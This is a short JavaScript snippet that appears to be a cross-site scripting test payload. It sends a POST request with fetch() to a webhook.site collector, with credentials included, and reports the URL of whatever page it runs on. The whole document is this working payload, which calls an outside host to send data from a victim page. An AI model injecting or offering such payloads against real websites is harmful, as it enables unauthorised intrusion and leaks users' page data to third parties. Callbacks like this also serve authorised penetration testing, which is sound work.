fetch('https://webhook.site/3e4d431e-387c-4df7-b2d6-3db80395504c', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  body: 'XSS test from ' + location.href
});
